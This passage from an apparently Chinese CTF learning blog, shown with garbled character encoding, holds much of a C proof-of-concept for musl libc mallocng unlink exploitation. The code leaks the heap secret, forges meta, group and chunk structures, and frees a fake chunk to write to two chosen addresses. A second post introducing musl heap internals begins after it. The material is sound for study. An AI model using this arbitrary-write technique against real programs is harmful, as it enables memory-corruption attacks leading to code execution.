class="string">&quot;ç¬¬&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ¬¡mallocè¿”å›çš„åœ°å€ä¸ºï¼š&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;\næ¥ä¸‹æ¥è®©æˆ‘ä»¬ç”¨æºç ä¸­ç»™å‡ºçš„å¯»æ‰¾chunkæ‰€åœ¨metaçš„æ–¹æ³•å›æº¯è¿™äº›chunkæ‰€åœ¨çš„groupå’Œmetaã€‚\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">groups</span>[14];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">metas</span>[14];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        groups[i] = get_group(chunks[i]);</span><br><span class="line">        metas[i] = get_meta(chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;ç¬¬&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ¬¡mallocè·å¾—chunkçš„groupåœ°å€å’Œmetaåœ°å€åˆ†åˆ«ä¸ºï¼š&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p %p\n\033[0m&quot;</span>, groups[i], metas[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;é€šè¿‡nontrivial_freeä¸­çš„dequeueå‡½æ•°è¿›è¡Œunlinkï¼Œé¦–å…ˆè¦é€šè¿‡get_metaå‡½æ•°çš„é‡é‡æ£€æŸ¥ï¼š\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/meta.h, line 129)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static inline struct meta *get_meta(const unsigned char *p)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!((uintptr_t)p &amp; 15));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint offset = *(const uint16_t *)(p - 2);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint index = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (p[-4]) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(!offset);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\toffset = *(uint32_t *)(p - 8);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt; 0xffff);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta *meta = base-&gt;meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(meta-&gt;mem == base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(index &lt;= meta-&gt;last_idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(area-&gt;check == ctx.secret);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;sizeclass &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(meta-&gt;sizeclass == 63);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct meta *)meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä¸‹é¢æˆ‘ä»¬é€ä¸€æŸ¥çœ‹ä¸€ä¸‹è¿™äº›æ£€æŸ¥çš„å…·ä½“å†…å®¹ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;1. meta-&gt;mem == baseï¼Œå³metaä¸­ä¿å­˜çš„groupæŒ‡é’ˆè¦æ­£ç¡®ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;2. index &lt;= meta-&gt;last_idxï¼Œå³chunkçš„ç´¢å¼•ä¸èƒ½è¶Šç•Œã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(RED   , HIGHLIGHT, <span class="string">&quot;3. area-&gt;check == ctx.secretï¼Œå³metaæ‰€åœ¨çš„meta_areaçš„æ ¡éªŒå€¼æ­£ç¡®ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;4. offset &gt;= size_classes[meta-&gt;sizeclass]*index\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;5. offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)ï¼Œè¿™ä¸¤ä¸ªæ£€æŸ¥offsetå’Œchunkå¤§å°æ˜¯å¦å¯¹åº”ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;6. assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);ï¼Œå³æ£€æŸ¥offsetæ˜¯å¦è¶Šç•Œã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;è¿™äº›æ£€æŸ¥ä¹‹ä¸­å¯¹æˆ‘ä»¬æœ€ä¸ºé‡è¦çš„å°±æ˜¯æ ¡éªŒå€¼çš„æ£€æŸ¥ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;åªæœ‰æ³„éœ²å‡ºsecretå€¼ï¼Œæˆ‘ä»¬æ‰èƒ½é‡Šæ”¾ä¼ªé€ meta_areaä¸­ä¼ªé€ metaçš„groupçš„chunkã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">area</span> =</span> get_meta_area(metas[<span class="number">0</span>]);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä¸Šé¢åˆ†é…çš„æ‰€æœ‰metaå‡åœ¨åŒä¸€ä¸ªmeta_areaä¸­ï¼Œåœ°å€ä¸ºï¼š&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\n\033[0m&quot;</span>, area);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;å¯ä»¥ç”±æ­¤è·å–åˆ°secretçš„å€¼ä¸ºï¼š&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%#llx\n\n\033[0m&quot;</span>, area-&gt;check);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> secret = area-&gt;check;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ¥ä¸‹æ¥æˆ‘ä»¬æ¥ä¼ªé€ chunkä»¥åŠå…¶ä¸Šçš„ç»“æ„ã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* mmap_space = mmap((<span class="type">void</span>*)<span class="number">0xdeadbeef000</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = <span class="number">7</span>;       <span class="comment">// groupä¸­ä¿å­˜çš„chunkå¤§å°ï¼Œè¿™é‡Œè®¾ç½®ä¸º0x80</span></span><br><span class="line">    fake_meta-&gt;last_idx = <span class="number">4</span>;        <span class="comment">// groupä¸­chunkçš„æ€»æ•°ï¼Œè¿™é‡Œè®¾ç½®ä¸º4è¡¨ç¤ºchunkæ€»æ•°ä¸º5</span></span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;        <span class="comment">// é€šè¿‡okay_to_freeæ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;    <span class="comment">// é€šè¿‡æ£€æŸ¥1</span></span><br><span class="line">    fake_group-&gt;meta = fake_meta;   <span class="comment">// ä½¿groupèƒ½å¤Ÿæ‰¾åˆ°meta</span></span><br><span class="line">    fake_meta-&gt;avail_mask = <span class="number">0b11101</span>;<span class="comment">// ä½¿nontrivial_freeè¿›å…¥ifå¾ªç¯ï¼Œå¾—ä»¥æ‰§è¡Œdequeue</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fake_chunk = (<span class="type">char</span>*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span> + <span class="number">0x10</span> + <span class="number">0x80</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">short</span> *)(fake_chunk - <span class="number">2</span>) = <span class="number">8</span>;    <span class="comment">// offset</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">char</span>*)(fake_chunk - <span class="number">3</span>) = <span class="number">1</span>;      <span class="comment">// index</span></span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ç»•è¿‡ç¬¬1ä¸ªæ£€æŸ¥ï¼Œåªéœ€è¦è®¾ç½®metaä¸­çš„groupæŒ‡é’ˆä¸ºå‡groupæŒ‡é’ˆå³å¯ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ç¬¬2ä¸ªæ£€æŸ¥éœ€è¦æ­£ç¡®è®¾ç½®chunkçš„indexå€¼ï¼Œæœ¬ç¨‹åºé‡Šæ”¾çš„æ˜¯groupä¸­ç¬¬2ä¸ªchunkï¼Œå› æ­¤ç´¢å¼•ä¸º1ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ³¨æ„ç´¢å¼•å€¼å­˜æ”¾çš„ä½ç½®ï¼Œæ˜¯chunkåœ°å€-3è¿™ä¸ªå­—èŠ‚ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ç¬¬3ä¸ªæ£€æŸ¥éœ€è¦æˆ‘ä»¬æå‰æ³„éœ²secretçš„å€¼ï¼Œå¹¶å¡«å†™åˆ°meta_areaä¸­ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ£€æŸ¥4å’Œ5åªéœ€è¦æ­£ç¡®è®¡ç®—chunkçš„å¤§å°ï¼Œå¡«å†™chunkçš„ç´¢å¼•å€¼å³å¯ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æœ¬ç¨‹åºå°è¯•é‡Šæ”¾sizeclass=7çš„chunkï¼Œå³chunkå¤§å°ä¸º0x80ï¼Œå› æ­¤ç¬¬2ä¸ªchunkçš„ç´¢å¼•ä¸º0x80&gt;&gt;4=8ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ç´¢å¼•å€¼indexä¿å­˜åœ¨chunkçš„å‰é¢ä¸¤ä¸ªå­—èŠ‚ä¸­ï¼Œæ­£ç¡®å¡«å…¥å³å¯ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ­£ç¡®è®¾ç½®indexåï¼Œæ£€æŸ¥6ä¸€èˆ¬ä¹Ÿæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;åœ¨é€šè¿‡get_metaçš„æ£€æŸ¥åï¼Œè¿˜éœ€è¦é€šè¿‡nontrivial_freeä¸­çš„ifè¯­å¥æ¡ä»¶åˆ¤æ–­ã€‚\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 72)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo nontrivial_free(struct meta *g, int i)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t self = 1u&lt;&lt;i;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))\033[1;&quot;</span> PURPLE <span class="string">&quot;m &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// any multi-slot group is necessarily on an active list\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// here, but single-slot groups might or might not be.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (g-&gt;next) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tint activate_new = (ctx.active[sc]==g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tdequeue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\tactivate_group(ctx.active[sc]);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\treturn free_group(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else if (!mask) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// might still be active if there were no allocations\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// after last available slot was taken.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (ctx.active[sc] != g) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tqueue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\ta_or(&amp;g-&gt;freed_mask, self);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct mapinfo)&#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;åªéœ€è¦ä¿®æ”¹metaä¸­çš„freeableå­—æ®µä¸º1å³å¯é€šè¿‡è¯¥æ£€æŸ¥ã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æœ€åè¿˜éœ€è¦åœ¨free_groupä¸­è¿›å…¥æ­£ç¡®çš„elseåˆ†æ”¯ï¼š\n\n&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 14)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo free_group(struct meta *g)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct mapinfo mi = &#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (sc &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tctx.usage_by_class[sc] -= g-&gt;last_idx+1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (g-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstep_seq();\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\trecord_seq(sc);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.base = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.len = g-&gt;maplen*4096UL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tvoid *p = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstruct meta *m = get_meta(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tint idx = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tg-&gt;mem-&gt;meta = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi = nontrivial_free(m, idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfree_meta(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn mi;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;è¿™éœ€è¦æˆ‘ä»¬è®¾ç½®meta-&gt;maplenä¸ºéé›¶å€¼ï¼Œé˜²æ­¢å†æ¬¡è¿›å…¥nontrivial_freeã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;è¿™é‡Œçš„maplenå°±è®¾ç½®ä¸ºgroupå ç”¨çš„é¡µæ•°é‡å³å¯ã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ¥ä¸‹æ¥æˆ‘ä»¬å‘metaçš„ä¸¤ä¸ªé“¾è¡¨æŒ‡é’ˆå†™å…¥äº‹å…ˆå‡†å¤‡å¥½çš„åœ°å€ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;prevå†™å…¥ï¼š&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_1);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;nextå†™å…¥ï¼š&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_2);</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = (<span class="keyword">struct</span> meta*)victim_1;</span><br><span class="line">    fake_meta-&gt;next = (<span class="keyword">struct</span> meta*)victim_2;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä¸‹é¢è°ƒç”¨freeå‡½æ•°é‡Šæ”¾è¿™ä¸ªå‡chunkã€‚\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;é‡Šæ”¾åï¼Œç›®æ ‡åœ°å€é™„è¿‘çš„å€¼å·²ç»è¢«æˆåŠŸä¿®æ”¹ï¼š\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim_1, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™è¯æ˜ä½¿ç”¨ä¸€ä¸ªå‡chunkä¿®æ”¹ä¸¤ä¸ªåœ°å€çš„å€¼æ˜¯å¯è¡Œçš„ï¼Œåœ¨freeä¹‹åï¼Œchunkæ‰€åœ¨çš„é¡µè¢«é‡Šæ”¾äº†ï¼Œè¿™æ ·å°±ä¸ä¼šå¯¹æ¥ä¸‹æ¥çš„è¿›ä¸€æ­¥åˆ©ç”¨é€ æˆå…¶ä»–ä»»ä½•å½±å“äº†ã€‚</p>
<p>ä¸ºäº†åˆ©ç”¨unlinkï¼Œæˆ‘ä»¬éœ€è¦æ„é€ å¾ˆå¤šä¸œè¥¿ï¼Œä¸èƒ½è½ä¸‹å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œåœ¨è§£é¢˜ä¸å­¦ä¹ æ—¶è¦ç‰¹åˆ«æ³¨æ„ã€‚åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­ç¬”è€…å°†ä¼šåˆ†æunlinkå¦‚ä½•ä¸FILEç»“æ„ä½“é…åˆï¼Œä»è€Œæœ€ç»ˆgetshellã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">musl pwn å…¥é—¨ (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:39:21" itemprop="dateCreated datePublished" datetime="2023-02-28T22:39:21+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>è¿‘å¹´æ¥ï¼Œmusl libcä½œä¸ºä¸€ä¸ªè½»é‡çº§çš„libcè¶Šæ¥è¶Šå¤šåœ°å‡ºç°åœ¨CTF pwné¢˜ä¹‹ä¸­ï¼Œå…¶å’Œglibcç›¸æ¯”æœ‰ä¸€å®šçš„å·®è·ï¼Œå› æ­¤æœ¬æ–‡æˆ‘ä»¬å°±musl libcæœ€å¸¸è€ƒçš„è€ƒç‚¹â€”â€”å†…å­˜åˆ†é…ï¼Œè¿›è¡Œmusl libcçš„æºä»£ç å®¡è®¡ã€‚</p>
<p>ä¸åŒäºglibcå¤šè¾¾å››äº”åƒè¡Œä»£ç ï¼Œå¤§å°è¶…è¿‡10wå­—èŠ‚çš„malloc.cï¼Œmusl libcä¸­çš„malloc.cå¤§å°ç”šè‡³éƒ½ä¸åˆ°1wå­—èŠ‚ï¼Œå…¶è½»é‡çº§çš„ç‰¹æ€§ä¹Ÿä½¿å¾—æˆ‘ä»¬æ›´åŠ å®¹æ˜“å»é˜…è¯»å®ƒçš„ä»£ç ã€‚</p>
<p>musl libcåœ¨å†…å­˜åˆ†é…ä¸Šç»å†è¿‡ä¸€æ¬¡å¤§çš„æ”¹åŠ¨ï¼ˆ1.2.0-&gt;1.2.1ï¼‰ï¼Œæœ¬æ–‡é’ˆå¯¹å‘æ–‡æ—¶çš„æœ€æ–°ç‰ˆæœ¬1.2.3è¿›è¡Œåˆ†æã€‚</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269533.htm#msg_header_h3_6">ä¼ é€é—¨</a></p>
<h1 id="1-ä¸»è¦æ•°æ®ç»“æ„"><a class="markdownIt-Anchor" href="#1-ä¸»è¦æ•°æ®ç»“æ„"></a> 1. ä¸»è¦æ•°æ®ç»“æ„</h1>
<h2 id="malloc_context"><a class="markdownIt-Anchor" href="#malloc_context"></a> malloc_context</h2>
